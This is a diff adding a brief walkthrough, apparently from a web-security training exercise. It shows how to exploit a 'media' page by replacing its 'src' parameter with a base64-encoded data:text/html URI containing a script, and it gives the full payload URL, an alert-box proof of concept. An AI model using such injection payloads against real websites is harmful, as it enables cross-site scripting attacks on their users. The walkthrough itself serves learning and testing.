@@ -1,0 +1,7 @@
+Go to the {{your ip adress}}/?page=media&src=nsa page.
+
+Change the src "nsa" by a javascript code, with MIME specified text/html, encode in base 64.
+
+URL become something like:
+
+{{your ip adress}}/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiV0FaQSIpPC9zY3JpcHQ+
